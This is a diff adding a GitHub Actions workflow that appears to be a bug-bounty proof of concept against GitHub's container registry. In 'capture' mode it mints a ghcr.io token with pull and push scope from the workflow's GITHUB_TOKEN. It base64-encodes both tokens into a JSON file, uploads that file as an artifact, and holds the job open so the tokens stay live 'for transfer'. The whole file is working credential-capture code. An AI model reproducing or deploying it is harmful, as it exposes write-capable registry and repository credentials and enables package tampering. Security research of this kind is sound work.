@@ -1,0 +1,69 @@
+name: ghcr-derived-capability-boundary
+
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        required: true
+        type: choice
+        options:
+          - bootstrap
+          - capture
+      tag:
+        required: true
+        type: string
+      marker:
+        required: true
+        type: string
+      delay:
+        required: true
+        default: "0"
+        type: string
+
+permissions:
+  contents: read
+  packages: write
+
+jobs:
+  boundary:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Bootstrap linked package
+        if: inputs.mode == 'bootstrap'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          MARKER: ${{ inputs.marker }}
+          IMAGE: ghcr.io/h1-no01-a-org-260907/h1-ghcr-derived-pkg-57975697
+          TAG: ${{ inputs.tag }}
+        run: |
+          printf '%s\n' "$MARKER" > marker.txt
+          printf '%s' "$GH_TOKEN" | docker login ghcr.io -u "$GITHUB_ACTOR" --password-stdin
+          docker build -t "$IMAGE:$TAG" .
+          docker push "$IMAGE:$TAG"
+      - name: Mint controlled derived capabilities
+        if: inputs.mode == 'capture'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PACKAGE: h1-no01-a-org-260907/h1-ghcr-derived-pkg-57975697
+        run: |
+          response="$(curl -fsS -u "$GITHUB_ACTOR:$GH_TOKEN" --get --data-urlencode 'service=ghcr.io' --data-urlencode "scope=repository:$PACKAGE:pull,push" https://ghcr.io/token)"
+          registry_token="$(printf '%s' "$response" | jq -r '.token')"
+          test -n "$registry_token"
+          github_b64="$(printf '%s' "$GH_TOKEN" | base64 -w0)"
+          registry_b64="$(printf '%s' "$registry_token" | base64 -w0)"
+          jq -n --arg github "$github_b64" --arg registry "$registry_b64" --arg repo "$GITHUB_REPOSITORY" --arg run "$GITHUB_RUN_ID" '{github_b64:$github,registry_b64:$registry,repository:$repo,run_id:$run}' > captured.json
+          echo "DERIVED_CAPABILITY_CAPTURED"
+      - uses: actions/upload-artifact@v4
+        if: inputs.mode == 'capture'
+        with:
+          name: controlled-derived-capability
+          path: captured.json
+          retention-days: 1
+      - name: Hold capability live for transfer
+        if: inputs.mode == 'capture'
+        env:
+          DELAY: ${{ inputs.delay }}
+        run: |
+          echo "TRANSFER_BOUNDARY_READY"
+          sleep "$DELAY"
